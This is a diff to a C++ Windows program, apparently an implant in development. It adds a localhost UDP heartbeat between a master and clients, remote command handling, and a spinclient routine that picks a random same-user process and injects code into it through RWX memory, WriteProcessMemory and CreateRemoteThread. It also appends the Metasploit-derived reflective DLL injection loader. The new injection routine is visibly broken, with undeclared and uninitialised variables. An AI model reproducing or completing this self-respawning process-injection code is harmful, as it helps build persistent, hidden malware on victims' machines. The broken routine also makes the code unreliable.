@@ -2,6 +2,9 @@
 #include "stdafx.h"
 #include "packetwatch.h"
 #include <ctime>
+#include <Windows.h>
+#include <psapi.h>
+#include <random>
 
 #pragma comment (lib, "Ws2_32.lib")
 
@@ -26,10 +29,10 @@ void PacketWatch::start()
 		NULL,
 		0,
 		(PTHREAD_START_ROUTINE)packetwatch_trampoline,
-		this,
-		0,
-		0
-	);
+this,
+0,
+0
+);
 }
 
 DWORD WINAPI PacketWatch::mymain(LPVOID lpParam)
@@ -43,93 +46,158 @@ DWORD WINAPI PacketWatch::mymain(LPVOID lpParam)
 	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-	SOCKET socketS;
+SOCKET socketS;
 
-	struct sockaddr_in local;
-	struct sockaddr_in from;
-	struct sockaddr_in serverInfo;
-	int srvlen = sizeof(serverInfo);
-	int fromlen = sizeof(from);
+struct sockaddr_in local;
+struct sockaddr_in from;
+struct sockaddr_in serverInfo;
+int srvlen = sizeof(serverInfo);
+int fromlen = sizeof(from);
 
-	timeval timeout;
-	timeout.tv_sec = 5;
+timeval timeout;
+timeout.tv_sec = 5;
 
-	clock_t lpsawt;
-	int failcount = 0;
-	lpsawt = clock();
+clock_t lpsawt;
+int failcount = 0;
+lpsawt = clock();
 
-	FD_SET fds;
-	int total;
+FD_SET fds;
+int total;
 
-	socketS = 0;
+socketS = 0;
 
-	master = false;
+master = false;
 
-	while (1 == 1) {
+//for debugging
+std::cout << "Starting Client\n";
+spinclient();
 
-		if (!socketS) {  // Need to test if socket is stilll good here.
-			socketS = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  // Not sure why protocol parm is zero, but from example so going with it.
+while (1 == 1) {
 
-			if (master == TRUE) {
-				//would connect, but udp doesn't need to.
-			}
-			else {
-				local.sin_family = AF_INET;
-				local.sin_port = htons(9999);
-				local.sin_addr.s_addr = INADDR_ANY;
 
-				if (bind(socketS, (sockaddr*)&local, sizeof(local)) == SOCKET_ERROR) {
-					std::cout << "bind failed.\n";
-					//possibly become master, possibly quit.  for now zero the socket.
-					closesocket(socketS);
-					socketS = 0;
-					Sleep(5000);
-				}
+
+	if (!socketS) {  // Need to test if socket is stilll good here.
+		socketS = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  // Not sure why protocol parm is zero, but from example so going with it.
+
+		if (master == TRUE) {
+			//would connect, but udp doesn't need to.
+		}
+		else {
+			local.sin_family = AF_INET;
+			local.sin_port = htons(9999);
+			local.sin_addr.s_addr = INADDR_ANY;
+
+			if (bind(socketS, (sockaddr*)&local, sizeof(local)) == SOCKET_ERROR) {
+				std::cout << "bind failed.\n";
+				//possibly become master, possibly quit.  for now zero the socket.
+				closesocket(socketS);
+				socketS = 0;
+				Sleep(5000);
 			}
 		}
+	}
 
 
 
-		//MessageBox(NULL, (LPCWSTR)L"Thread Ran", (LPCWSTR)L"Caption", MB_OK);
-		//std::cout << "PacketWatch::mymain Thread Ran\n";
-		//Sleep(5000);
+	//MessageBox(NULL, (LPCWSTR)L"Thread Ran", (LPCWSTR)L"Caption", MB_OK);
+	//std::cout << "PacketWatch::mymain Thread Ran\n";
+	//Sleep(5000);
 
-		if (socketS) {
+	if (socketS) {
 
-			if (master) {
+		if (master) {
 
-				std::cout << "Am I really Master?\n";
+			std::cout << "Loop as Master\n";
+			//connect to the client on localhost 9999
+			serverInfo.sin_family = AF_INET;
+			serverInfo.sin_port = htons(9999);
 
-				//connect to the client on localhost 9999
-				serverInfo.sin_family = AF_INET;
-				serverInfo.sin_port = htons(9999);
+			char destinationstr[] = "127.0.0.1";
+			InetPtonA(AF_INET, destinationstr, (VOID *)&(serverInfo.sin_addr));
 
-				char destinationstr[] = "127.0.0.1";
-				InetPtonA(AF_INET, destinationstr, (VOID *)&(serverInfo.sin_addr));
-
-				strncpy_s(buffer, 2048, "Master Lives\x00", sizeof("Master Lives\x00"));
+			strncpy_s(buffer, 2048, "Master Lives\x00", sizeof("Master Lives\x00"));
 
 
-				//This result should be failing when the port isn't listening.  Why isn't it?
+			//This result should be failing when the port isn't listening.  Why isn't it?
 
-				int result = sendto(socketS, buffer, strlen(buffer), 0, (sockaddr *)&serverInfo, srvlen);
-				if (result == SOCKET_ERROR) {
-					if (WSAGetLastError() == WSAECONNRESET) {
-						//Assuming reset error is correct.
-						//spin up another client.
-						std::cout << "Starting a client.\n";
+			int result = sendto(socketS, buffer, strlen(buffer), 0, (sockaddr *)&serverInfo, srvlen);
+			if (result == SOCKET_ERROR) {
+				if (WSAGetLastError() == WSAECONNRESET) {
+					//Assuming reset error is correct.
+					//spin up another client.
+					std::cout << "Starting a client.\n";
+					failcount = 0;
+					lpsawt = clock();
+					spinclient();
+				}
+				else {
+					std::cout << "Socket error that wasn't connreset.\n";
+				}
+			}
+			else {
+				//Master is looking for heartbeat response.
+				FD_ZERO(&fds);
+				FD_SET(socketS, &fds);
+
+				if ((total = select(100, &fds, NULL, NULL, &timeout) == SOCKET_ERROR)) {
+					std::cout << "Select failed.\n";
+				}
+
+				if (FD_ISSET(socketS, &fds)) {
+					if (recvfrom(socketS, buffer, sizeof(buffer), 0, (sockaddr *)&serverInfo, &srvlen) != SOCKET_ERROR) {
+						std::cout << "Heartbeat Response: " << buffer << "\n";
 						failcount = 0;
 						lpsawt = clock();
 					}
 					else {
-						std::cout << "Socket error that wasn't connreset.\n";
+						int lasterror = WSAGetLastError();
+
+						if (lasterror == WSAECONNRESET) {
+							failcount++;
+							if (failcount > 5) {
+								std::cout << "Starting a client.\n";
+								failcount = 0;
+								lpsawt = clock();
+								spinclient();
+							}
+						}
+						else {
+							std::cout << "Got Socket Error reading hearbeat response. (wasn't connection reset) Error is: " << WSAGetLastError() << "\n";
+						}
 					}
 				}
-				std::cout << "Sendto result was: " << result << "\n";
+				else {
+					float elapsed = (clock() - lpsawt) / CLOCKS_PER_SEC;
+					std::cout << "Elapsed is: " << elapsed << "\n";
+					if (elapsed > 5) {
+						if (failcount > 4) {
+							//Missed Heartbeat response too many times.
+							failcount = 0;
+							lpsawt = clock();
+							std::cout << "Packetwait - Heart failed, spinning client.\n";
+							spinclient();
+						}
+						else {
+							lpsawt = clock();
+							failcount++;
+							std::cout << "Packetwait - Hearbeat response has failed " << failcount << " times.\n";
+						}
+					}
+				}
+
+//				std::cout << "Sendto result was: " << result << "\n";
 				//Master only sends packets every once in a while.
+
+				if (failcount > 5) {
+					std::cout << "Starting a client.\n";
+					failcount = 0;
+					lpsawt = clock();
+					spinclient();
+				}
 				Sleep(5000);
 			}
-			else {
+		}
+		else {
 
 				ZeroMemory(buffer, sizeof(buffer));
 				//std::cout << "PacketWait - Waiting for packet.\n";
@@ -154,6 +222,8 @@ DWORD WINAPI PacketWatch::mymain(LPVOID lpParam)
 							failcount = 0;
 							lpsawt = clock();
 							std::cout << "Master heart received\n";
+							strncpy_s(buffer, 2048, "Hi Master\x00", sizeof("Hi Master\x00"));
+							sendto(socketS, buffer, sizeof(buffer), 0, (sockaddr *)&from, fromlen);
 						}
 						else if (strncmp(buffer, "action_1", strlen("action_1")) == 0) {
 							action_1();
@@ -187,6 +257,7 @@ DWORD WINAPI PacketWatch::mymain(LPVOID lpParam)
 							failcount = 0;
 							master = true;
 							std::cout << "Packetwait - Master assumed.\n";
+							lpsawt = clock();
 						}
 						else {
 							lpsawt = clock();
@@ -446,3 +517,427 @@ void PacketWatch::RunCommand() {
 
 	
 }
+
+
+bool compatible(HANDLE hProcess) {
+	//look for process that matches my current level.
+	//user or SYSTEM
+
+	HANDLE myToken, TargetToken;
+
+	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &myToken)) {
+		std::cout << "Couldn't get my own token.\n";
+		return false;
+	}
+
+	if (!OpenProcessToken(hProcess, TOKEN_READ, &TargetToken)) {
+		std::cout << "Couldn't open target token.\n";
+		return false;
+	}
+
+	wchar_t targetusername[256];
+	
+
+	DWORD dwProcessTokenInfoAllocSize = 0;
+	GetTokenInformation(TargetToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);
+
+	// Call should have failed due to zero-length buffer.
+	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
+	{
+		// Allocate buffer for user information in the token.
+		PTOKEN_USER pUserToken = (TOKEN_USER *)malloc(dwProcessTokenInfoAllocSize);
+		if (pUserToken != NULL)
+		{
+			// Now get user information in the allocated buffer
+			if (GetTokenInformation(TargetToken, TokenUser, pUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
+			{
+				// Some vars that we may need
+				SID_NAME_USE   snuSIDNameUse;
+				TCHAR          szUser[MAX_PATH] = { 0 };
+				DWORD          dwUserNameLength = MAX_PATH;
+				TCHAR          szDomain[MAX_PATH] = { 0 };
+				DWORD          dwDomainNameLength = MAX_PATH;
+
+				// Retrieve user name and domain name based on user's SID.
+				if (::LookupAccountSid(NULL,
+					pUserToken->User.Sid,
+					szUser,
+					&dwUserNameLength,
+					szDomain,
+					&dwDomainNameLength,
+					&snuSIDNameUse))
+				{
+
+					// We succeeded
+					_snwprintf_s(targetusername, 256, L"\\\\%s\\%s", szDomain, szUser);
+					
+
+				}//End if
+			}// End if
+			free(pUserToken);
+		}// End if
+	}// End if
+
+	wchar_t myusername[256];
+	dwProcessTokenInfoAllocSize = 0;
+	GetTokenInformation(myToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);
+
+	// Call should have failed due to zero-length buffer.
+	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
+	{
+		// Allocate buffer for user information in the token.
+		PTOKEN_USER pmyUserToken = (TOKEN_USER *)malloc(dwProcessTokenInfoAllocSize);
+		if (pmyUserToken != NULL)
+		{
+			// Now get user information in the allocated buffer
+			if (GetTokenInformation(myToken, TokenUser, pmyUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
+			{
+				// Some vars that we may need
+				SID_NAME_USE   snuSIDNameUse;
+				TCHAR          szUser[MAX_PATH] = { 0 };
+				DWORD          dwUserNameLength = MAX_PATH;
+				TCHAR          szDomain[MAX_PATH] = { 0 };
+				DWORD          dwDomainNameLength = MAX_PATH;
+
+				// Retrieve user name and domain name based on user's SID.
+				if (::LookupAccountSid(NULL,
+					pmyUserToken->User.Sid,
+					szUser,
+					&dwUserNameLength,
+					szDomain,
+					&dwDomainNameLength,
+					&snuSIDNameUse))
+				{
+					_snwprintf_s(myusername, 256, L"\\\\%s\\%s", szDomain, szUser);
+					// We succeeded
+					std::wcout << "Process user: " << targetusername << " My User: " << myusername << "\n";
+
+					if (wcscmp(targetusername, myusername) == 0) {
+						free(pmyUserToken);
+						CloseHandle(TargetToken);
+						CloseHandle(myToken);
+						return true;
+					}
+				}//End if
+			}// End if
+			free(pmyUserToken);
+		}// End if
+	}// End if
+
+	CloseHandle(TargetToken);
+	CloseHandle(myToken);
+
+	return false;
+}
+
+
+int PacketWatch::pickprocess() {
+	//Get a process list?
+	DWORD list[1024], cbneeded, cProcesses;
+	
+	if (!EnumProcesses(list, sizeof(list), &cbneeded)) {
+		std::cout << "EnumProcesses failed.\n";
+	}
+
+	cProcesses = cbneeded / sizeof(DWORD);
+
+	DWORD iter;
+	int potentialcount = 0;
+	DWORD potentials[1024];
+
+	HANDLE hProcess;
+
+	std::cout << "Found " << cProcesses << " processes.\n";
+
+	for (iter = 0; iter < cProcesses; iter++) {
+		//Need to weed out potentials.
+		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, list[iter]);
+		if (hProcess != NULL) {
+			HMODULE hmod;
+			if (compatible(hProcess)) {
+				potentials[potentialcount] = list[iter];
+				potentialcount++;
+			}
+		}
+		else {
+			std::cout << "Opening pid: " << list[iter] << " failed.\n";
+		}
+		CloseHandle(hProcess);
+	}
+
+	std::cout << "Found " << potentialcount << " eligible processes.\n";
+
+	srand((unsigned)time(NULL));
+	int ran = rand() % potentialcount;
+	std::cout << "Picket pid: " << potentials[ran] << ".\n";
+
+	return potentials[ran];
+}
+
+void PacketWatch::spinclient() {
+
+	HANDLE hProcess;
+	HANDLE hThread;
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	DWORD dwLength;
+
+
+	//Pick process
+	int pid = pickprocess();
+
+	//Attach to process
+	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+
+	if (hProcess != NULL) {
+		int dllLength = 100;
+		void *lpBuffer = HeapAlloc(GetProcessHeap(), 0, dllLength);
+
+		// alloc memory (RWX) in the host process for the image...
+		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return;
+
+		// write the image into the host process...
+		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+			return;
+		
+		// code from metasploit implies there should be a fuction REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
+		hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);
+	}
+
+
+}
+
+//===============================================================================================//
+// Copyright (c) 2013, Stephen Fewer of Harmony Security (www.harmonysecurity.com)
+// All rights reserved.
+// 
+// Redistribution and use in source and binary forms, with or without modification, are permitted 
+// provided that the following conditions are met:
+// 
+//     * Redistributions of source code must retain the above copyright notice, this list of 
+// conditions and the following disclaimer.
+// 
+//     * Redistributions in binary form must reproduce the above copyright notice, this list of 
+// conditions and the following disclaimer in the documentation and/or other materials provided 
+// with the distribution.
+// 
+//     * Neither the name of Harmony Security nor the names of its contributors may be used to
+// endorse or promote products derived from this software without specific prior written permission.
+// 
+// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR 
+// IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND
+// FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR 
+// CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
+// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
+// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY 
+// THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR 
+// OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE 
+// POSSIBILITY OF SUCH DAMAGE.
+//===============================================================================================//
+#include "LoadLibraryR.h"
+//===============================================================================================//
+DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
+{
+	WORD wIndex = 0;
+	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
+	PIMAGE_NT_HEADERS pNtHeaders = NULL;
+
+	pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);
+
+	pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);
+
+	if (dwRva < pSectionHeader[0].PointerToRawData)
+		return dwRva;
+
+	for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
+	{
+		if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
+			return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData);
+	}
+
+	return 0;
+}
+//===============================================================================================//
+DWORD GetReflectiveLoaderOffset(VOID * lpReflectiveDllBuffer)
+{
+	UINT_PTR uiBaseAddress = 0;
+	UINT_PTR uiExportDir = 0;
+	UINT_PTR uiNameArray = 0;
+	UINT_PTR uiAddressArray = 0;
+	UINT_PTR uiNameOrdinals = 0;
+	DWORD dwCounter = 0;
+#ifdef _WIN64
+	DWORD dwMeterpreterArch = 2;
+#else
+	// This will catch Win32 and WinRT.
+	DWORD dwMeterpreterArch = 1;
+#endif
+
+	uiBaseAddress = (UINT_PTR)lpReflectiveDllBuffer;
+
+	// get the File Offset of the modules NT Header
+	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;
+
+	// currenlty we can only process a PE file which is the same type as the one this fuction has  
+	// been compiled as, due to various offset in the PE structures being defined at compile time.
+	if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x010B) // PE32
+	{
+		if (dwMeterpreterArch != 1)
+			return 0;
+	}
+	else if (((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.Magic == 0x020B) // PE64
+	{
+		if (dwMeterpreterArch != 2)
+			return 0;
+	}
+	else
+	{
+		return 0;
+	}
+
+	// uiNameArray = the address of the modules export directory entry
+	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+
+	// get the File Offset of the export directory
+	uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress, uiBaseAddress);
+
+	// get the File Offset for the array of name pointers
+	uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames, uiBaseAddress);
+
+	// get the File Offset for the array of addresses
+	uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);
+
+	// get the File Offset for the array of name ordinals
+	uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals, uiBaseAddress);
+
+	// get a counter for the number of exported functions...
+	dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->NumberOfNames;
+
+	// loop through all the exported functions to find the ReflectiveLoader
+	while (dwCounter--)
+	{
+		char * cpExportedFunctionName = (char *)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress));
+
+		if (strstr(cpExportedFunctionName, "ReflectiveLoader") != NULL)
+		{
+			// get the File Offset for the array of addresses
+			uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions, uiBaseAddress);
+
+			// use the functions name ordinal as an index into the array of name pointers
+			uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));
+
+			// return the File Offset to the ReflectiveLoader() functions code...
+			return Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress);
+		}
+		// get the next exported function name
+		uiNameArray += sizeof(DWORD);
+
+		// get the next exported function name ordinal
+		uiNameOrdinals += sizeof(WORD);
+	}
+
+	return 0;
+}
+//===============================================================================================//
+// Loads a DLL image from memory via its exported ReflectiveLoader function
+HMODULE WINAPI LoadLibraryR(LPVOID lpBuffer, DWORD dwLength)
+{
+	HMODULE hResult = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	DWORD dwOldProtect1 = 0;
+	DWORD dwOldProtect2 = 0;
+	REFLECTIVELOADER pReflectiveLoader = NULL;
+	DLLMAIN pDllMain = NULL;
+
+	if (lpBuffer == NULL || dwLength == 0)
+		return NULL;
+
+	__try
+	{
+		// check if the library has a ReflectiveLoader...
+		dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+		if (dwReflectiveLoaderOffset != 0)
+		{
+			pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpBuffer + dwReflectiveLoaderOffset);
+
+			// we must VirtualProtect the buffer to RWX so we can execute the ReflectiveLoader...
+			// this assumes lpBuffer is the base address of the region of pages and dwLength the size of the region
+			if (VirtualProtect(lpBuffer, dwLength, PAGE_EXECUTE_READWRITE, &dwOldProtect1))
+			{
+				// call the librarys ReflectiveLoader...
+				pDllMain = (DLLMAIN)pReflectiveLoader();
+				if (pDllMain != NULL)
+				{
+					// call the loaded librarys DllMain to get its HMODULE
+					// Dont call DLL_METASPLOIT_ATTACH/DLL_METASPLOIT_DETACH as that is for payloads only.
+					if (!pDllMain(NULL, DLL_QUERY_HMODULE, &hResult))
+						hResult = NULL;
+				}
+				// revert to the previous protection flags...
+				VirtualProtect(lpBuffer, dwLength, dwOldProtect1, &dwOldProtect2);
+			}
+		}
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		hResult = NULL;
+	}
+
+	return hResult;
+}
+//===============================================================================================//
+// Loads a PE image from memory into the address space of a host process via the image's exported ReflectiveLoader function
+// Note: You must compile whatever you are injecting with REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR 
+//       defined in order to use the correct RDI prototypes.
+// Note: The hProcess handle must have these access rights: PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
+//       PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+// Note: If you are passing in an lpParameter value, if it is a pointer, remember it is for a different address space.
+// Note: This function currently cant inject accross architectures, but only to architectures which are the 
+//       same as the arch this function is compiled as, e.g. x86->x86 and x64->x64 but not x64->x86 or x86->x64.
+HANDLE WINAPI LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter)
+{
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	HANDLE hThread = NULL;
+	DWORD dwReflectiveLoaderOffset = 0;
+	DWORD dwThreadId = 0;
+
+	__try
+	{
+		do
+		{
+			if (!hProcess || !lpBuffer || !dwLength)
+				break;
+
+			// check if the library has a ReflectiveLoader...
+			dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);
+			if (!dwReflectiveLoaderOffset)
+				break;
+
+			// alloc memory (RWX) in the host process for the image...
+			lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+			if (!lpRemoteLibraryBuffer)
+				break;
+
+			// write the image into the host process...
+			if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, NULL))
+				break;
+
+			// add the offset to ReflectiveLoader() to the remote library address...
+			lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+
+			// create a remote thread in the host process to call the ReflectiveLoader!
+			hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, lpParameter, (DWORD)NULL, &dwThreadId);
+
+		} while (0);
+
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		hThread = NULL;
+	}
+
+	return hThread;
+}
+//===============================================================================================//
